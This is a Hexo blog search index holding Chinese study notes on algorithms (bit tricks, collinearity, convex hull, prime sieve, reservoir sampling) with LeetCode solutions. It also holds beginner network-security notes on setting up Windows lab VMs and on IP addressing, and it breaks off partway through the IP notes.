<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>Brian Kernighan Algorithm</title>
    <url>/2022/05/25/Algorithm/Brian-Kernighan-Algorithm/</url>
    <content><![CDATA[<h1 id="Brian-Kernighan-Algorithm"><a href="#Brian-Kernighan-Algorithm" class="headerlink" title="Brian Kernighan Algorithm"></a>Brian Kernighan Algorithm</h1><h2 id="principle"><a href="#principle" class="headerlink" title="principle"></a>principle</h2><p>通过一定的位运算取到二进制数据的相应位</p>
<ol>
<li><p>$n\&amp;(n-1)$ 将数据二进制最右的 1 变为 0 </p>
<p>例如：$n = 11_{(10)} = 1011_{(2)}, n\&amp;(n-1) = 1011 \&amp; 1010 = 1010_{(2)} = 10_{(10)}$</p>
</li>
<li><p>$n\&amp;(~n+1)$ 提取数据二进制最后一个 1 到结尾的数据</p>
<p>例如：$n = 14_{(10)} = 1110_{(2)}, n\&amp;(~n+1) = 1110 \&amp; 0001 + 00001 = 1110 \&amp; 0010 = 0010_{(2)} = 2_{(10)}$</p>
</li>
</ol>
<p>可以测试一下：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">n = random.randint(<span class="number">0</span>,<span class="number">16</span>)</span><br><span class="line"><span class="built_in">print</span>(n,<span class="built_in">bin</span>(n))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;n&amp;(n−1):&#x27;</span>,n&amp;(n-<span class="number">1</span>),<span class="built_in">bin</span>(n&amp;(n-<span class="number">1</span>)))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;n&amp;(~n+1):&#x27;</span>,n&amp;(~n+<span class="number">1</span>),<span class="built_in">bin</span>(n&amp;(~n+<span class="number">1</span>)))</span><br></pre></td></tr></table></figure>
<h2 id="example："><a href="#example：" class="headerlink" title="example："></a>example：</h2><p><a href="https://leetcode.cn/problems/number-of-1-bits/">191. 位1的个数</a></p>
]]></content>
      <categories>
        <category>Code_Algo</category>
      </categories>
      <tags>
        <tag>Math,Binary</tag>
      </tags>
  </entry>
  <entry>
    <title>如何判断三点是否共线？</title>
    <url>/2022/06/09/Algorithm/%E5%A6%82%E4%BD%95%E5%88%A4%E6%96%AD%E4%B8%89%E7%82%B9%E6%98%AF%E5%90%A6%E5%85%B1%E7%BA%BF%EF%BC%9F/</url>
    <content><![CDATA[<h2 id="判断三点共线"><a href="#判断三点共线" class="headerlink" title="判断三点共线"></a>判断三点共线</h2><p>判断三点是否共线，有三种方法（其实实质上是两种）</p>
<p>点 $(x_1,y_1),(x_2,y_2),(x_3,y_3)$ </p>
<h3 id="1-计算斜率"><a href="#1-计算斜率" class="headerlink" title="1. 计算斜率"></a>1. 计算斜率</h3><p>明显，如果三点组成两条直线斜率相同，则共线：</p>
<p>判断条件：</p>
<script type="math/tex; mode=display">
(y_2-y_1)/(x_2-x_1) \overset{?}{=} (y_3-y_1)/(x_3-x_1)</script><p>如果分母存在 0 ，就不能够计算了。所有可以把上式转换为乘法（也就是向量叉乘）</p>
<h3 id="2-向量叉乘"><a href="#2-向量叉乘" class="headerlink" title="2. 向量叉乘"></a>2. 向量叉乘</h3><script type="math/tex; mode=display">
|\overset{\rightarrow}{a}\times\overset{\rightarrow}{b}| = |\overset{\rightarrow}{a}|*|\overset{\rightarrow}{b}|*sin\theta=(y_3−y_1) * (x_2−x_1) − (y_2−y_1) * (x_3−x_1)</script><p>如果共线，结果为 0 </p>
<h3 id="3-三角形面积"><a href="#3-三角形面积" class="headerlink" title="3. 三角形面积"></a>3. 三角形面积</h3><p>如果三点共线，面积自然为 0 </p>
<script type="math/tex; mode=display">
S=\frac{1}{2}\left|\begin{array}{lll}
x 1 & y 1 & 1 \\
x 2 & y 2 & 1 \\
x 3 & y 3 & 1
\end{array}\right|\\
=(x_1*y_2 + x_2*y_3 + x_3*y_1 - x_1*y_3 - x_2*y_1 - x_3*y_2)</script><h3 id="例题："><a href="#例题：" class="headerlink" title="例题："></a>例题：</h3><h4 id="1037-Valid-Boomerang"><a href="#1037-Valid-Boomerang" class="headerlink" title="1037. Valid Boomerang"></a><a href="https://leetcode.cn/problems/valid-boomerang/">1037. Valid Boomerang</a></h4><p>Given an array <code>points</code> where <code>points[i] = [xi, yi]</code> represents a point on the <strong>X-Y</strong> plane, return <code>true</code> <em>if these points are a <strong>boomerang</strong></em>.</p>
<p>A <strong>boomerang</strong> is a set of three points that are <strong>all distinct</strong> and <strong>not in a straight line</strong>.</p>
<p><strong>Example 1:</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Input: points = [[1,1],[2,3],[3,2]]</span><br><span class="line">Output: true</span><br></pre></td></tr></table></figure>
<p><strong>Example 2:</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Input: points = [[1,1],[2,2],[3,3]]</span><br><span class="line">Output: false</span><br></pre></td></tr></table></figure>
<p><strong>Constraints:</strong></p>
<ul>
<li><code>points.length == 3</code></li>
<li><code>points[i].length == 2</code></li>
<li><code>0 &lt;= xi, yi &lt;= 100</code></li>
</ul>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">isBoomerang</span>(<span class="params">self, points: <span class="type">List</span>[<span class="type">List</span>[<span class="built_in">int</span>]]</span>) -&gt; <span class="built_in">bool</span>:</span><br><span class="line">        <span class="comment">#斜率，但不能保证没有 0 </span></span><br><span class="line">        <span class="comment">#return (points[1][1]-points[0][1])/(points[1][0]-points[0][0]) != (points[2][1]-points[0][1])/(points[2][0]-points[0][0])</span></span><br><span class="line">        <span class="comment">#转换为 乘法求</span></span><br><span class="line">        <span class="keyword">return</span> (points[<span class="number">1</span>][<span class="number">0</span>]-points[<span class="number">0</span>][<span class="number">0</span>])*(points[<span class="number">2</span>][<span class="number">1</span>]-points[<span class="number">0</span>][<span class="number">1</span>]) != (points[<span class="number">1</span>][<span class="number">1</span>]-points[<span class="number">0</span>][<span class="number">1</span>])*(points[<span class="number">2</span>][<span class="number">0</span>]-points[<span class="number">0</span>][<span class="number">0</span>])</span><br><span class="line"></span><br><span class="line">        <span class="comment">#三角形面积(如果三角形面积不为 0 则满足题意)</span></span><br><span class="line">        <span class="comment">#(x1*y2 + x2*y3 + x3*y1 - x1*y3 - x2*y1 - x3*y2)</span></span><br><span class="line">        <span class="comment">#return points[0][0]*points[1][1] + points[1][0]*points[2][1] + points[2][0]*points[0][1] - points[0][0]*points[2][1] - points[1][0]*points[0][1] - points[2][0]*points[1][1] != 0</span></span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>Code_Algo</category>
      </categories>
      <tags>
        <tag>Math,Binary</tag>
      </tags>
  </entry>
  <entry>
    <title>凸包算法</title>
    <url>/2022/05/25/Algorithm/%E5%87%B8%E5%8C%85%E7%AE%97%E6%B3%95/</url>
    <content><![CDATA[<h2 id="凸包算法"><a href="#凸包算法" class="headerlink" title="凸包算法"></a>凸包算法</h2><p># 待补充：Jarvis，Andrew </p>
<p>感谢<a href="https://blog.csdn.net/KnightHONG/article/details/101860288">凸包算法详解(Graham扫描法)</a>，由<a href="https://leetcode-cn.com/problems/erect-the-fence/">leetcode 587. 安装栅栏</a> 而来。</p>
<p>理解凸包算法之前需要理解以下几个概念：</p>
<ol>
<li>向量积</li>
<li>Jarvis算法</li>
<li>Graham扫描，及极角排序</li>
<li>Andrew 算法</li>
</ol>
<h3 id="向量积"><a href="#向量积" class="headerlink" title="向量积"></a>向量积</h3><p>在高等数学中，向量的运算包括数量积和向量积：</p>
<p>*数量积，又叫点乘，定义是</p>
<script type="math/tex; mode=display">
\vec{a}=[a_1,a_2,...,a_n]\;and\;\vec{b}=[b_1,b_2,...,b_n]\\
\vec{a} \cdot \vec{b}=\sum_{i\in{(1,n)}}{a_ib_i}</script><p>理解为对应位相乘再相加，如果向量为布尔向量，则乘操作变为 $AND$ 加操作变为 $XOR$ 。</p>
<p>也可以表示为：</p>
<script type="math/tex; mode=display">
\vec{a} \cdot \vec{b}=|\vec{a}||\vec{b}|\cos\theta</script><p>从矩阵的角度理解为 $\vec{a}\cdot\vec{b} = \vec{a}^T*\vec{b}$</p>
<p>例如$\vec{a}=[1,2]^T,\vec{b}=[2,1]^T\;\;\rightarrow\;\;\vec{a}\cdot\vec{b} = 1<em>2+2</em>1=4$ 即点乘得到的是一个数</p>
<p><strong>*向量积</strong>，又叫叉乘，定义为（二维表示）</p>
<script type="math/tex; mode=display">
{\displaystyle \mathbf {\vec{a}} \times \mathbf {\vec{b}} =\|\mathbf {\vec{a}} \|*\|\mathbf {\vec{b}} \|\sin(\theta )\ \mathbf {n} }</script><p>$|\mathbf {a} |\;and\;|\mathbf {b} |$表示向量的模长，$\sin(\theta )$ 是两个向量在其所定义的平面上的夹角，$n$ 为 $\mathbf {\vec{a}} \;and\; \mathbf {\vec{b}}$ 所构成平面上的单位向量，$n$ 的方向根据右手定则判断（从 $\vec{a}$ 到 $\vec{b}$ 弯转四指，大拇指所指方向即为叉乘所得向量方向）所有向量积得到的是一个垂直于由 $\mathbf {\vec{a}} \;and\; \mathbf {\vec{b}}$ 所构成平面的向量，与 $\mathbf {\vec{a}} \;and\; \mathbf {\vec{b}}$ 所构成平面的法向量平行，<strong>如果与法向量同向，则结果取正，否则结果取负</strong>。也可以理解为与法向量反向时，由 $\mathbf {\vec{a}} \times \mathbf {\vec{b}}$ 变成了 $\mathbf {\vec{b}} \times \mathbf {\vec{a}}$ ，所以 $\mathbf {\vec{a}} \times \mathbf {\vec{b}} = -\mathbf {\vec{b}} \times \mathbf {\vec{a}}$ 或者也可表示为取模的形式，得到一个数字而非向量：</p>
<script type="math/tex; mode=display">
{\displaystyle |\mathbf {\vec{a}} \times \mathbf {\vec{b}}| =\|\mathbf {\vec{a}} \|*\|\mathbf {\vec{b}} \|\sin(\theta )}=(a_1*b_2)-(a_2*b_1)</script><p><img src="https://img-blog.csdnimg.cn/20191002101207446.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0tuaWdodEhPTkc=,size_16,color_FFFFFF,t_70" alt="img"></p>
<h3 id="Graham"><a href="#Graham" class="headerlink" title="Graham"></a>Graham</h3><h4 id="极角排序"><a href="#极角排序" class="headerlink" title="极角排序"></a>极角排序</h4><p>我们知道，二维平面上一个向量可以由一个点来表示，如：</p>
<center>
    <img src="https://img-blog.csdnimg.cn/20191001210234595.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0tuaWdodEhPTkc=,size_8,color_FFFFFF,t_70" alt="img" style="zoom:50%;" />
</center>

<p>其中用点表示为 $p1,p2,p3…$ 用向量表示为 $\mathop{p0p1}\limits ^{\rightarrow},\vec{p0p2}…$ （注意这里把 $p0$ 看作原点）</p>
<p>要将以上的各个向量排序，当然不能仅依赖其坐标，那么很自然的考虑到其与坐标轴的夹角，这里以 x 轴正半轴为基准轴，将向量按照与其夹角由小到大排序，那么顺序就是 $\mathop{p0p1}\limits ^{\rightarrow},\vec{p0p2}…\vec{p0p8}$  </p>
<p>做好极角排序的准备工作之后，就可以开始开始凸包算法的<strong>Graham扫描</strong>了。</p>
<h4 id="Graham扫描"><a href="#Graham扫描" class="headerlink" title="Graham扫描"></a>Graham扫描</h4><p>所谓 Graham 扫描，即寻找最外层能够将所有点包含住的一条封闭线，例如：</p>
<center>
    <img src="https://img-blog.csdnimg.cn/20191001212355831.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0tuaWdodEhPTkc=,size_16,color_FFFFFF,t_70" width="60%">
</center>

<p>开始扫描，是将原点 $p0$ 与排序后的第一个顶点  $p1$ 相连得到向量 $\vec{p0p1}$，然后再将  $p1$ 与排序得到的下一个顶点相连，得到 $\vec{p1p2}$，此时需要进行一次判断：</p>
<ul>
<li><p>新加入的点和其与前一个点构成的向量是否为向左偏转（相对于前一条向量）如果是，则该点可能是构成凸包的最外层顶点；</p>
</li>
<li><p>否则，即新加入的点和其与前一个点构成的向量向右偏转（相对于前一条向量），则前面加入的点可能由于新加入了该点而不在外层顶点，换成新加入的点为构成凸包的最外层顶点。</p>
</li>
</ul>
<p>以上图举例：</p>
<p>加入 $p0p1$ 为第一条向量（$p1$ 纳入最外层顶点集），加入 $p1p2$ 为第二条向量（$p2$ 纳入最外层顶点集），此时根据图形判断，相对于第一条向量为向左偏转，加入 $p2p3$ 为第三条向量，判断 $p2p3$ 相对于 $p1p2$ 为向右偏转，则删除点 $p2$ 而将 $p3$ 纳入最外层顶点集…以此类推</p>
<p>那么如何用数学语言判断向量是向哪个方向偏转呢？——向量积，如下图，顶点记 $a=(0,0)$ ，两个向量顶点 $b=(2,3)\;and\;c=(1,5)\;or\;(5,3)$ ：</p>
<p>左图 $\vec{ab(=(2,3))}\times\vec{ac(=(1,5))}=2<em>5-3</em>1=7&gt;0$ ，即向左偏；</p>
<p>右图 $\vec{ab(=(2,3))}\times\vec{ac(=(5,3))}=2<em>3-3</em>5=-9&lt;0$，即向右偏；</p>
<center>
    <img src="https://uploadfiles.nowcoder.com/images/20220423/629760107_1650711275955/6FB53C51539B47559CF0D122A832CF63" width="50%"><img src="https://uploadfiles.nowcoder.com/images/20220423/629760107_1650711275950/FE88E01440218FA643954E80A16BEDBB" width="50%">
</center>


<p>很明显，通过上面对向量积的描述可以推断出当绿色向量相对于蓝色向量向左偏转时叉乘结果为正，向右则为负。</p>
<p>经过对所有顶点的依照条件：</p>
<ol>
<li>将各个坐标依极角排序</li>
<li>新加入点构成的向量较前一条向量向左偏转（叉乘为正）</li>
<li>将满足条件的点留在凸包顶点集，不满足的剔除</li>
</ol>
<p>就得到了一系列顶点的凸包，此即为使用Graham扫描的凸包算法的基本思想。</p>
<p>C语言代码：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"></span><br></pre></td></tr></table></figure>
<h3 id="Jarvis"><a href="#Jarvis" class="headerlink" title="Jarvis"></a>Jarvis</h3><h3 id="Andrew"><a href="#Andrew" class="headerlink" title="Andrew"></a>Andrew</h3>]]></content>
      <categories>
        <category>Code_Algo</category>
      </categories>
      <tags>
        <tag>Math</tag>
      </tags>
  </entry>
  <entry>
    <title>素数筛</title>
    <url>/2022/05/25/Algorithm/%E7%B4%A0%E6%95%B0%E7%AD%9B/</url>
    <content><![CDATA[<h1 id="素数筛"><a href="#素数筛" class="headerlink" title="素数筛"></a>素数筛</h1><h2 id="艾氏筛"><a href="#艾氏筛" class="headerlink" title="艾氏筛"></a>艾氏筛</h2><p>筛出小于 n 的所有素数</p>
<ol>
<li>建立数组记录每个值是否为素数，初始化全是素数；</li>
<li>遍历数组（<strong>遍历到 sqrt(n) 就够了</strong>），将当前值 i 的倍数全部划为合数类；</li>
<li>得到一个划分和素数与合数的数组</li>
</ol>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">countPrimes</span>(<span class="params">self, n: <span class="built_in">int</span></span>) -&gt; <span class="built_in">int</span>:</span><br><span class="line">        <span class="keyword">if</span> n &lt; <span class="number">2</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span></span><br><span class="line">        isPrime = [<span class="number">1</span>] * n</span><br><span class="line">        isPrime[<span class="number">0</span>] = isPrime[<span class="number">1</span>] = <span class="number">0</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">2</span>, <span class="built_in">int</span>(n ** <span class="number">0.5</span>) + <span class="number">1</span>):</span><br><span class="line">            <span class="keyword">if</span> isPrime[i]:</span><br><span class="line">                <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(i*i,n,i):</span><br><span class="line">                    isPrime[j] = <span class="number">0</span></span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">sum</span>(isPrime)</span><br></pre></td></tr></table></figure>
<p>例子： <a href="https://leetcode.cn/problems/count-primes/">204. 计数质数</a></p>
]]></content>
      <categories>
        <category>Code_Algo</category>
      </categories>
      <tags>
        <tag>Math</tag>
      </tags>
  </entry>
  <entry>
    <title>约瑟夫环</title>
    <url>/2022/05/25/Algorithm/%E7%BA%A6%E7%91%9F%E5%A4%AB%E7%8E%AF/</url>
    <content><![CDATA[<h1 id="约瑟夫环"><a href="#约瑟夫环" class="headerlink" title="约瑟夫环"></a>约瑟夫环</h1><p>参见：</p>
<p> <a href="https://leetcode-cn.com/problems/find-the-winner-of-the-circular-game/">1823. 找出游戏的获胜者</a></p>
<h4 id="剑指-Offer-62-圆圈中最后剩下的数字"><a href="#剑指-Offer-62-圆圈中最后剩下的数字" class="headerlink" title="剑指 Offer 62. 圆圈中最后剩下的数字"></a><a href="https://leetcode-cn.com/problems/yuan-quan-zhong-zui-hou-sheng-xia-de-shu-zi-lcof/">剑指 Offer 62. 圆圈中最后剩下的数字</a></h4>]]></content>
      <categories>
        <category>Code_Algo</category>
      </categories>
      <tags>
        <tag>Math</tag>
      </tags>
  </entry>
  <entry>
    <title>蓄水池采样</title>
    <url>/2022/05/25/Algorithm/%E8%93%84%E6%B0%B4%E6%B1%A0%E7%AE%97%E6%B3%95/</url>
    <content><![CDATA[<h1 id="蓄水池采样算法-Reservoir-Sampling"><a href="#蓄水池采样算法-Reservoir-Sampling" class="headerlink" title="蓄水池采样算法 (Reservoir Sampling)"></a>蓄水池采样算法 (Reservoir Sampling)</h1><p><a href="https://www.bilibili.com/video/BV17i4y1j7wE/?spm_id_from=333.788.recommend_more_video.1">https://www.bilibili.com/video/BV17i4y1j7wE/?spm_id_from=333.788.recommend_more_video.1</a></p>
<p>假设有一个蓄水池，蓄水池里不断加水，问如何在每一时刻都能以相同概率采样到数据？当然还可能有很多别的理解方式，但都要求在数据量变化的情况下使得抽样的概率相等。</p>
<p>具体例子：<a href="https://leetcode-cn.com/problems/random-pick-index/">398. 随机数索引</a></p>
<p>当然，存在很多现有的函数能够实现随机采样，但归其根源，考虑用概率解决：</p>
<h2 id="算法过程"><a href="#算法过程" class="headerlink" title="算法过程"></a>算法过程</h2><p>假设数据序列的规模为 $n$，需要采样的数量的为 $k$。</p>
<p>首先构建一个可容纳 $k$ 个元素的数组，将序列的前 $k$ 个元素放入数组中。</p>
<p>然后从第 $k+1$ 个元素开始，以 $k_n$ 的概率来决定该元素是否被替换到数组中（数组中的元素被替换的概率是相同的）。 当遍历完所有元素之后，数组中剩下的元素即为所需采取的样本。</p>
<h2 id="证明过程"><a href="#证明过程" class="headerlink" title="证明过程"></a>证明过程</h2><p>也可以抽取的样本是 $1$，概率就变成 $\frac{1}{n}$ ，如下：</p>
<p>当只有一个数据时，采样到的概率为 $1$ ；</p>
<p>加入一个数据时，取到它的概率为 $\frac{1}{2}$，那么，取到第一个数据的概率也为  $\frac{1}{2}$；</p>
<p>再加入一个数据，取到它的概率为 $\frac{1}{3}$，取到前两个数据的概率就应该发生变化，为 之前的概率*本次未被选中的概率，即$\frac{1}{2}\times(1-\frac{1}{3})=\frac{1}{3}$；</p>
<p>以此类推…</p>
<p>对于抽样 $k$ 个数据集：</p>
<p>对于第 $i$ 个数$（i≤ki≤k）$。在 $k$ 步之前，被选中的概率为 $1$。当走到第 $k+1$ 步时，被第 $k+1$ 个元素构成的新集合替换的概率 = $k+1$ 个元素中选中前 $k$ 个的概率 <em> 前 $k$ 个中选一个替换的概率，即为 $\frac{k}{k+1}</em>\frac{1}{k}=\frac{1}{k+1}$。则被保留的概率为 $1-\frac{1}{k+1}=\frac{k}{k+1}$。以此类推，则运行到第 $n$ 步时，被保留的概率 = 被选中的概率 * 不被替换的概率，即：</p>
<script type="math/tex; mode=display">
1\times\frac{k}{k+1}\times\frac{k+1}{k+2}\times...\times\frac{n-1}{n}=\frac{k}{n}\\
or\\
\frac{n-1}{n}\times\frac{n-2}{n-1}\times...\times\frac{k}{k+1}\times1=\frac{k}{n}</script><p>这是符合要求的。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">i = 0</span><br><span class="line">s = NULL</span><br><span class="line">for line in lines:</span><br><span class="line">	i = i + 1</span><br><span class="line">	r = random.choice(0,1)</span><br><span class="line">	if r &lt; 1/i:</span><br><span class="line">		s = line #替换</span><br></pre></td></tr></table></figure>
<h2 id="关于为什么替换"><a href="#关于为什么替换" class="headerlink" title="关于为什么替换"></a>关于为什么替换</h2><p>替换就是采样，不断地替换或者不替换表示当前是否采样到该数据；</p>
<h2 id="例题："><a href="#例题：" class="headerlink" title="例题："></a>例题：</h2><h4 id="398-Random-Pick-Index"><a href="#398-Random-Pick-Index" class="headerlink" title="398. Random Pick Index"></a><a href="https://leetcode.cn/problems/random-pick-index/">398. Random Pick Index</a></h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">class Solution:</span></span><br><span class="line"><span class="string">    def __init__(self, nums: List[int]):</span></span><br><span class="line"><span class="string">        self.position = defaultdict(list)</span></span><br><span class="line"><span class="string">        for i,num in enumerate(nums):</span></span><br><span class="line"><span class="string">            self.position[num].append(i)</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    def pick(self, target: int) -&gt; int:</span></span><br><span class="line"><span class="string">        #print(self.position)</span></span><br><span class="line"><span class="string">        #print(choice(self.position[target]))</span></span><br><span class="line"><span class="string">        return choice(self.position[target])</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">#官方解答1</span></span><br><span class="line"><span class="string">class Solution:</span></span><br><span class="line"><span class="string">    def __init__(self, nums: List[int]):</span></span><br><span class="line"><span class="string">        self.pos = defaultdict(list)</span></span><br><span class="line"><span class="string">        for i, num in enumerate(nums):</span></span><br><span class="line"><span class="string">            self.pos[num].append(i)</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    def pick(self, target: int) -&gt; int:</span></span><br><span class="line"><span class="string">        return choice(self.pos[target])</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">#官方题解2 蓄水池采样</span></span><br><span class="line"><span class="string">class Solution:</span></span><br><span class="line"><span class="string">    def __init__(self, nums: List[int]):</span></span><br><span class="line"><span class="string">        self.nums = nums</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    def pick(self, target: int) -&gt; int:</span></span><br><span class="line"><span class="string">        ans = cnt = 0</span></span><br><span class="line"><span class="string">        for i, num in enumerate(self.nums):</span></span><br><span class="line"><span class="string">            if num == target:</span></span><br><span class="line"><span class="string">                cnt += 1  # 第 cnt 次遇到 target</span></span><br><span class="line"><span class="string">                if randrange(cnt) == 0:</span></span><br><span class="line"><span class="string">                    ans = i</span></span><br><span class="line"><span class="string">            #print(&quot;ans=&quot;,ans,&quot;cnt=&quot;,cnt)</span></span><br><span class="line"><span class="string">        return ans</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, nums: <span class="type">List</span>[<span class="built_in">int</span>]</span>):</span><br><span class="line">        self.nums = nums</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">pick</span>(<span class="params">self, target: <span class="built_in">int</span></span>) -&gt; <span class="built_in">int</span>:</span><br><span class="line">        res = indx = <span class="number">0</span></span><br><span class="line">        <span class="keyword">for</span> i, num <span class="keyword">in</span> <span class="built_in">enumerate</span>(self.nums):</span><br><span class="line">            <span class="keyword">if</span> num == target:</span><br><span class="line">                <span class="comment">#用 cnt 记录，表示从 (0,cnt) 中随机抽取一个数</span></span><br><span class="line">                <span class="comment">#用来均衡概率，使抽到的概率每次都为 1/（targe的数量)</span></span><br><span class="line">                indx += <span class="number">1</span></span><br><span class="line">                <span class="keyword">if</span> randrange(indx) == <span class="number">0</span>:</span><br><span class="line">                    <span class="comment">#print(randrange(indx))</span></span><br><span class="line">                    res = i</span><br><span class="line">        <span class="keyword">return</span> res</span><br><span class="line"></span><br><span class="line"><span class="comment"># Your Solution object will be instantiated and called as such:</span></span><br><span class="line"><span class="comment"># obj = Solution(nums)</span></span><br><span class="line"><span class="comment"># param_1 = obj.pick(target)</span></span><br></pre></td></tr></table></figure>
<h4 id="497-Random-Point-in-Non-overlapping-Rectangles"><a href="#497-Random-Point-in-Non-overlapping-Rectangles" class="headerlink" title="497. Random Point in Non-overlapping Rectangles"></a><a href="https://leetcode.cn/problems/random-point-in-non-overlapping-rectangles/">497. Random Point in Non-overlapping Rectangles</a></h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span>:</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, rects: <span class="type">List</span>[<span class="type">List</span>[<span class="built_in">int</span>]]</span>):</span><br><span class="line">        self.rectangle = rects</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">pick</span>(<span class="params">self</span>) -&gt; <span class="type">List</span>[<span class="built_in">int</span>]:</span><br><span class="line">        SumPoints = <span class="number">0</span></span><br><span class="line">        idx = <span class="number">0</span></span><br><span class="line">        <span class="keyword">for</span> i,(x1,y1,x2,y2) <span class="keyword">in</span> <span class="built_in">enumerate</span>(self.rectangle):</span><br><span class="line">            curPoints = (x2-x1+<span class="number">1</span>) * (y2-y1+<span class="number">1</span>)    <span class="comment">#当前矩形包含的点数</span></span><br><span class="line">            SumPoints += curPoints  <span class="comment">#总点数</span></span><br><span class="line">            <span class="keyword">if</span> random.randint(<span class="number">0</span>,SumPoints) &lt; curPoints:</span><br><span class="line">                <span class="comment">#这个判断的依据</span></span><br><span class="line">                <span class="comment">#如：第一次加 curSum=9,第二次加 curSum=9+12=21</span></span><br><span class="line">                <span class="comment">#第 1 次采样一定取第 1 个矩形</span></span><br><span class="line">                <span class="comment">#第 2 次采样，取到小于 12 取第 2 个矩形，12~21 取第 1 个矩形（未变）</span></span><br><span class="line">                <span class="comment">#试下等概率采样</span></span><br><span class="line">                idx = i</span><br><span class="line">        x1,y1,x2,y2 = self.rectangle[idx]</span><br><span class="line">        <span class="keyword">return</span> [x1+random.randint(<span class="number">0</span>,x2-x1),y1+random.randint(<span class="number">0</span>,y2-y1)]</span><br><span class="line"></span><br><span class="line"><span class="comment"># Your Solution object will be instantiated and called as such:</span></span><br><span class="line"><span class="comment"># obj = Solution(rects)</span></span><br><span class="line"><span class="comment"># param_1 = obj.pick()</span></span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>Code_Algo</category>
      </categories>
      <tags>
        <tag>Math</tag>
      </tags>
  </entry>
  <entry>
    <title>网安学习_D.1_环境部署</title>
    <url>/2022/05/25/CS/%E7%BD%91%E5%AE%89%E5%AD%A6%E4%B9%A0-D-1-%E7%8E%AF%E5%A2%83%E9%83%A8%E7%BD%B2/</url>
    <content><![CDATA[<h1 id="环境配置"><a href="#环境配置" class="headerlink" title="环境配置"></a>环境配置</h1><p>使用 Vmware 装上几个旧window系统的虚拟机 win-xp/2003/7/2008</p>
<h2 id="winxp"><a href="#winxp" class="headerlink" title="winxp"></a>winxp</h2><p>我的配置：</p>
<ol>
<li>使用的 winxp_professional 镜像(来自 msdn.itellyou)，删掉了 打印机，声卡</li>
<li>分配 40G 空间（20+20）</li>
<li>关掉了防火墙和自动更新</li>
<li>至此，拍摄快照并克隆虚拟机（链接）<ul>
<li>链接克隆和完整克隆的区别：链接克隆创建一个主虚拟机的子链接， 与主虚拟机并存（占用空间小）；完整克隆复制出一个独立的虚拟机（占用和主虚拟机一样大的空间）</li>
</ul>
</li>
</ol>
<h2 id="win2003"><a href="#win2003" class="headerlink" title="win2003"></a>win2003</h2><p>同上</p>
<h2 id="win7"><a href="#win7" class="headerlink" title="win7"></a>win7</h2><p>没设密码</p>
<h2 id="win2008"><a href="#win2008" class="headerlink" title="win2008"></a>win2008</h2><p>同上</p>
]]></content>
      <categories>
        <category>CS</category>
      </categories>
      <tags>
        <tag>CS_OP</tag>
      </tags>
  </entry>
  <entry>
    <title>网安学习-D-2-ip及一些命令</title>
    <url>/2022/05/27/CS/%E7%BD%91%E5%AE%89%E5%AD%A6%E4%B9%A0-D-2-ip%E5%8F%8A%E4%B8%80%E4%BA%9B%E5%91%BD%E4%BB%A4/</url>
    <content><![CDATA[<p>ip 相关知识复习及常用 win 系统下的命令</p>
<h2 id="局域网"><a href="#局域网" class="headerlink" title="局域网"></a>局域网</h2><p>局域网：一般称为内网，同一个局域网中，所有IP必须在同一个网段才可以互相通信</p>
<p>单局域网构成：交换机，网线，pc</p>
<p>交换机：用来组建内网的局域网的设备</p>
<h2 id="ip"><a href="#ip" class="headerlink" title="ip"></a>ip</h2><p>网络号（识别主机所在网络） + 主机号（识别网络中的主机）</p>
<p>position_1.position_2.position_3.position_4  where  position  in [0,255]</p>
<p>ISO定义五大类：（是以IP地址的第一位进行区分的）</p>
<ul>
<li><p>A类：（政府用）</p>
<p>position_1 网络地址，position_2.position_3.position_4 主机地址</p>
<p>范围：1.0.0.1—126.155.255.254</p>
<p>私有地址和保留地址：</p>
